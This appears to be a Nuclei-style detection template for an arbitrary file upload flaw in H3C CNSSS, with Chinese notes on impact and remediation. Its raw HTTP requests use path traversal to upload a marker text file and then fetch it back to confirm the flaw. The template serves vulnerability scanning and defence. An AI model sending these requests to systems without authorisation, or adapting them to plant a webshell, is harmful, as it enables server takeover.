id: h3c-cnsss-arbitrary-file-upload

info:
  name: H3C CNSSS - Arbitrary - 任意文件上传漏洞
  author: s4e-io
  severity: critical
  description: |
    该模板用于检测 H3C CNSSS - Arbitrary - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/imc/primepush/%2e%2e/flexFileUpload`、`/imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/wy876/POC/blob/main/H3C-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9Fflexfileupload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: header="/selfservice"
  tags: h3c,lfi,intrusive,fileupload,vuln

variables:
  filename: "{{rand_base(10)}}"
  num: "{{rand_int(1000, 9999)}}"

http:
  - raw:
      - |
        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q

        -----------------WebKitFormBoundaryMmx988TUuintqO4Q
        Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"
        Content-Type: application/octet-stream

        {{md5(num)}}
        -----------------WebKitFormBoundaryMmx988TUuintqO4Q--

      - |
        GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"{{md5(num)}}")'
          - "status_code_1 == 200 && status_code_2 == 200"
        condition: and
